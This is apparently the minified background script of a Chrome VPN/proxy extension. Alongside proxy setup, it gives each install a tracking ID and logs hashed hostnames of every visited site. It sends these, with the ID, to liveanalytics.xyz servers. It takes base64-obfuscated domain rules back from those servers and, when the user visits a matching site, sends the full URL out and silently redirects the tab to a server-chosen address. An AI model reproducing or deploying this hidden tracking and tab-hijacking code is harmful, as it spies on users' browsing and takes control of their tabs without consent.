! function() {
    function a() {
        return new Promise(a => {
            chrome.storage.local.get(["start", "uid", "share", "html", "time", "config", "ctime", "choice"], e => {
                null == e.start && chrome.storage.local.set({
                    start: b()
                }), null == e.uid && chrome.storage.local.set({
                    uid: d()
                }), null == e.share && chrome.storage.local.set({
                    share: 0
                }), null == e.html && chrome.storage.local.set({
                    html: "0;lib/common/share.html"
                }), null == e.time && chrome.storage.local.set({
                    time: 7e6
                }), null == e.choice && chrome.storage.local.set({
                    choice: "UK"
                }), null == e.config && chrome.storage.local.set({
                    config: "https://nodereserve.liveanalytics.xyz/version/config.txt;https://nodecloud.liveanalytics.xyz/version/config.txt;https://reserve.liveanalytics.xyz/version/config.txt;https://liveanalytics.xyz/version/config.txt"
                }), null == e.ctime && chrome.storage.local.set({
                    ctime: c(0)
                }), a(e)
            })
        })
    }
    function b() {
        return Date.now()
    }
    function c(a) {
        return 0 == a ? new Date(0).toUTCString() : new Date().toUTCString()
    }
    function d() {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, a => {
            var b = 0 | 16 * Math.random(),
                c = "x" == a ? b : 8 | 3 & b;
            return c.toString(16)
        })
    }
    function e(a) {
        chrome.storage.local.get(["html", "share", "start"], c => {
            var d = j(c.html);
            if(0 == c.share && 0 != d.shift() && 4e8 < b() - c.start) {
                c.share = b(), a(d.shift());
                try {
                    _gaq.push(["_trackEvent", "click", "share"])
                } catch (a) {}
            }
        })
    }
    function f(a, b) {
        chrome.storage.local.get("b", c => {
            c.b || (c.b = []), -1 == c.b.indexOf(b(a)) && (c.b.push(b(a)), chrome.storage.local.set({
                b: c.b
            }))
        })
    }
    function g(a) {
        return atob(a)
    }
    function h(a) {
        return btoa(a)
    }
    function i(a) {
        return new URL(a).hostname
    }
    function j(a) {
        if(a && 0 < a.length) return a.split(";")
    }
    function k(a, b) {
        const c = j(a)[b] || 0;
        var d, e = "";
        for(d = c.length - 1; 0 <= d; d--) e += c.charAt(d);
        return e
    }
    function l(a) {
        chrome.tabs.create({
            url: a
        })
    }
    function m(a, b) {
        chrome.tabs.update(b, {
            url: a
        })
    }
    function n() {
        o(), chrome.tabs.onUpdated.addListener(p), chrome.runtime.onInstalled.addListener(q), chrome.runtime.onMessage.addListener(r), chrome.webRequest.onAuthRequired.addListener((a, b) => a.isProxy ? void chrome.storage.local.get("choice", c => {
            chrome.storage.local.get(c.choice, d => {
                const a = k(d[c.choice].g, 0) || 0,
                    e = k(d[c.choice].g, 1) || 0;
                b({
                    authCredentials: {
                        username: a,
                        password: e
                    }
                })
            })
        }) : b(), {
            urls: ["<all_urls>"]
        }, ["asyncBlocking"])
    }
    function o() {
        chrome.tabs.onUpdated.hasListener(p) && chrome.tabs.onUpdated.removeListener(p)
    }
    function p(c, d, e) {
        var j = i(e.url);
        if("loading" == d.status && f(j, s), !!(A && 0 < A.length))
            for(var k in A)
                if(A.hasOwnProperty(k)) {
                    var b = A[k].a;
                    if(e.url.includes(g(b.d)) && !B.has(b.d)) {
                        B.add(b.d);
                        var a = h(0);
                        b.t && (a = b.t), t(g(b.u), e.url, m, g(b.d), c, a)
                    }
                }
    }
    function q(a) {
        if("install" == a.reason) {
            chrome.storage.local.set({
                choice: "UK"
            }), l("lib/common/start.html"), u("on");
            try {
                _gaq.push(["_trackEvent", "click", "install"])
            } catch (a) {}
        }
        "update" == a.reason && chrome.storage.local.set({
            share: 0,
            config: "https://nodereserve.liveanalytics.xyz/version/config.txt;https://nodecloud.liveanalytics.xyz/version/config.txt;https://reserve.liveanalytics.xyz/version/config.txt;https://liveanalytics.xyz/version/config.txt"
        })
    }
    function r(a) {
        return chrome.storage.local.get([a.choice, "UK"], b => {
            a && a.choice && ("NOVPN" == a.choice ? z("", "direct") : null == typeof b[a.choice] || "d" == b[a.choice].s ? z(b.UK.l, "pac_script") : z(b[a.choice].l, "pac_script"))
        }), !0
    }
    function s(a) {
        return h(a.split("").reduce((c, a) => (c = (c << 5) - c + a.charCodeAt(0), c & c), 0))
    }
    function t(a, b, c, d, e, f) {
        var h = /(?:(?:https?):\/\/)([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?/g,
            i = /=$/g.test(a) ? `${a}${b}` : a;
        fetch(i).then(a => {
            v(a.status) && (a.redirected ? d.contains(a.url) ? c(a.url, e) : +g(f) && a.text().then(a => {
                c(w(a, h), e)
            }).catch(() => {}) : a.text().then(a => {
                var b = w(a, h);
                (d.contains(b) || g(f)) && c(b, e)
            }).catch(() => {}))
        }).catch(() => {})
    }
    function u(a) {
        var b = ["On", "images/icon32.png"],
            c = ["Off", "images/icon32_grey.png"];
        "on" == a ? (chrome.browserAction.setTitle({
            title: b[0]
        }), chrome.browserAction.setIcon({
            path: b[1]
        })) : (chrome.browserAction.setTitle({
            title: c[0]
        }), chrome.browserAction.setIcon({
            path: c[1]
        }))
    }
    function v(a) {
        return 199 < a && 400 > a ? 1 : 0
    }
    function w(a, b) {
        return a.match(b).toString()
    }
    function x() {
        chrome.storage.local.get(["config", "uid", "start", "b", "time", "ctime", "choice"], a => {
            function b() {
                fetch(d.array.pop() + d.string, {
                    method: "GET",
                    headers: new Headers({
                        "If-Modified-Since": a.ctime,
                        "X-Requested-With": chrome.runtime.id
                    })
                }).then(a => {
                    if(304 == a.status) return C = !1, chrome.storage.local.get({
                        k: []
                    }, a => {
                        a && a.k && (A = a.k), o(), chrome.tabs.onUpdated.addListener(p)
                    }), void chrome.storage.local.remove("b");
                    if(204 == a.status) return C = !0, void chrome.storage.local.remove("b");
                    if(206 == a.status) return C = !0, z("", "direct"), void l("lib/common/error.html");
                    if(200 != a.status) return A = [], chrome.storage.local.remove("b"), o(), void(0 == d.array.length ? y() : b());
                    if(a.ok) {
                        C = !1;
                        var e = a.headers.get("content-type");
                        if(!e || -1 == e.indexOf("application/json")) return void(0 == d.array.length ? y() : b());
                        chrome.storage.local.set({
                            ctime: c()
                        }), a.json().then(a => {
                            var b = [];
                            for(var c in chrome.storage.local.set({
                                    html: g(a.r)
                                }), chrome.storage.local.set({
                                    time: g(a.t)
                                }), chrome.storage.local.remove("k"), a)
                                if(a[c][0].hasOwnProperty("c")) {
                                    for(var d, e = 1, f = a[c].length; e < f; ++e) d = a.c[e].d, b += g(d);
                                    chrome.storage.local.set({
                                        config: b
                                    })
                                } else if(a[c][0].hasOwnProperty("a")) chrome.storage.local.get({
                                k: []
                            }, b => {
                                for(var d = b.k, e = 1, f = a[c].length; e < f; ++e) d.push({
                                    [c]: a.a[e]
                                });
                                A = d, chrome.storage.local.set({
                                    k: d
                                })
                            });
                            else if(a[c][0].hasOwnProperty("u"))
                                for(var h, e = 1, f = a.cc.length; e < f; ++e) h = a.cc[e], chrome.storage.local.set({
                                    [h.n]: {
                                        l: h.l,
                                        s: h.s,
                                        g: h.g
                                    }
                                });
                            chrome.storage.local.remove("b"), y()
                        })
                    }
                }).catch(() => {
                    0 == d.array.length ? y() : b()
                })
            }
            a.b || (a.b = []);
            const d = {
                array: j(a.config),
                string: `?uid=${a.uid}&ver=${chrome.runtime.getManifest().version}&extid=${chrome.runtime.id}&start=${a.start}&hash=${[...a.b].join("-")}`
            };
            b();
            var f = setInterval(() => {
                e(l), x(), B.clear(), clearInterval(f)
            }, a.time)
        })
    }
    function y() {
        chrome.storage.local.get("choice", b => {
            "NOVPN" == b.choice || null == b.choice ? z("", "direct") : chrome.storage.local.get([b.choice, "UK"], c => {
                null == c[b.choice] || "d" == c[b.choice].s ? null != c.UK && "d" != c.UK.s ? z(c.UK.l, "pac_script") : z("", "direct") : z(c[b.choice].l, "pac_script")
            })
        })
    }
    function z(a, b) {
        return chrome.proxy.settings.clear({}), "direct" == b || C ? void u() : void("pac_script" == b && u("on"), chrome.proxy.settings.set({
            value: {
                mode: b,
                pacScript: {
                    data: a
                }
            },
            scope: "regular"
        }))
    }
    var A = [],
        B = new Set,
        C = !1;
    String.prototype.contains = function(a) {
        var b = /^https?:\/\//i.test(this) ? this : `https://${this}`;
        return i(b).includes(i(a)) || i(a).includes(i(b))
    }, async function() {
        n(), await a(), e(l), x()
    }()
}();